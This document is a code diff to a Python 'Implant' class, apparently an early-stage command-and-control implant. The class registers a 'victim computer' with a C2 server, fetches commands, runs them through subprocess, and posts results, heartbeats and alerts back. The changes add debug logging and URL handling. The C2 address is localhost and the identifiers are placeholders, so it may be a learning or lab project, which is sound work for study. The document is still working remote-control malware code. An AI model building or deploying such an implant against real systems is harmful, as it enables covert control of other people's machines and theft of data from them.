@@ -1,17 +1,29 @@
 import requests
-import os
 import subprocess
 import hashlib
-import json
+from urllib.parse import urljoin
 
 class Implant():
-    def __init__(self, c2_addr):
+    def __init__(self, c2_addr, debug=False, implant_id=None):
         self.c2_addr = c2_addr
-        self.implant_id = self._gen_id()
+        if implant_id is not None:
+            self.implant_id = implant_id
+        else:
+            self.implant_id = self._gen_id()
+        self.debug = debug
     
     def _gen_id(self):
         mac_addr = "00:00:00:00:00:00"
         return hashlib.sha256(mac_addr.encode('utf-8')).hexdigest()
+
+    def _print_debug_request(self, r):
+        message = (
+            f"[DEBUG] Request Headers: {r.request.headers}\n"
+            f"[DEBUG] Request Body: {r.request.body}\n"
+            f"[DEBUG] Response Headers: {r.headers}\n"
+            f"[DEBUG] Response Body: {r.content}"
+        )
+        print(message)
     
     def register(self):
         data = {
@@ -22,16 +34,20 @@ class Implant():
             "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
             # "session_key": "dummy_session_key",  # (for crypto, eventually)
         }
-        requests.post("http://localhost:5000/registerImplant", data=json.dumps(data))
+        r = requests.post(urljoin(self.c2_addr, "register"), json=data)
+        if self.debug:
+            self._print_debug_request(r)
 
     def get_command(self):
         data = {
             "implant_id": self.implant_id,
         }
-        r = requests.get(os.path.join(self.c2_addr, "getNextCommand"), json=data)
+        r = requests.get(urljoin(self.c2_addr, "getNextCommand"), json=data)
+        if self.debug:
+            self._print_debug_request(r)
         res = r.text
         if not res:
-            return None, None
+            return None, None, None
         parts = res.split(",")
         command_id = parts[0]
         command_type = parts[1]
@@ -48,7 +64,9 @@ class Implant():
             "command_id": command_id,
             "result": result,
         }
-        requests.post(os.path.join(self.c2_addr, "sendCommandResult"), json=data)
+        r = requests.post(urljoin(self.c2_addr, "sendCommandResult"), json=data)
+        if self.debug:
+            self._print_debug_request(r)
     
     def get_command_and_run(self):
         command_id, command_type, command = self.get_command()
@@ -65,16 +83,19 @@ class Implant():
             "implant_id": self.implant_id,
             "still_active": True,
         }
-        requests.post(os.path.join(self.c2_addr, "heartbeat"), json=data)
+        r = requests.post(urljoin(self.c2_addr, "heartbeat"), json=data)
+        if self.debug:
+            self._print_debug_request(r)
     
     def alert(self, message):
         data = {
             "implant_id": self.implant_id,
             "error": message,
         }
-        requests.post(os.path.join(self.c2_addr, "alert"), json=data)
+        r = requests.post(urljoin(self.c2_addr, "alert"), json=data)
+        if self.debug:
+            self._print_debug_request(r)
 
 
 if __name__=="__main__":
-    implant = Implant("http://localhost:5000")
-    implant.register()
+    implant = Implant("http://localhost:5000", debug=True)
